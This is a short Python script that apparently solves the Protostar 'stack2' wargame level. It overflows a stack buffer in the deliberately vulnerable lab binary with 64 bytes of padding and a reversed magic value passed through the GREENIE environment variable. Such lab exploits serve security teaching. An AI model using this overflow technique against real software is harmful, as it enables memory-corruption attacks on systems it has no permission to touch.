import subprocess
import struct

program = "/opt/protostar/bin/stack2"

string = "A"*64 + "\x0d\x0a\x0d\x0a"[::-1]

env = {
    "GREENIE": string
}
process = subprocess.Popen([program,string], stdin=subprocess.PIPE, env=env)




